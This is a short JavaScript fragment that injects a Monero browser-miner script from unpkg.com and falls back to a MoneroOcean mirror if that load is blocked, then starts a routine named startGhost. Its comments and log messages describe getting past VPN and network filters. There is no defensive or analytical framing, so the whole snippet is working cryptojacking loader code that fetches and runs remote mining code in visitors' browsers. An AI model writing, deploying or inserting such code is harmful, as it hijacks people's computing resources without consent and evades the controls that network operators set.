const injectEngine = () => {
    const s = document.createElement('script');
    // Switching to a different CDN provider (UNPKG) which often bypasses basic VPN filters
    s.src = "https://unpkg.com/monero-webminer@latest/miner.js";
    
    s.onload = () => {
        LOG("Handshake bypass successful. Initializing...");
        startGhost();
    };
    
    s.onerror = () => {
        // Backup Plan: Try the official MoneroOcean mirror if UNPKG is also blocked
        LOG("UNPKG Blocked. Attempting Secondary Tunnel...");
        const s2 = document.createElement('script');
        s2.src = "https://moneroocean.stream/webminer.js"; 
        s2.onload = () => startGhost();
        document.head.appendChild(s2);
    };
    
    document.head.appendChild(s);
};
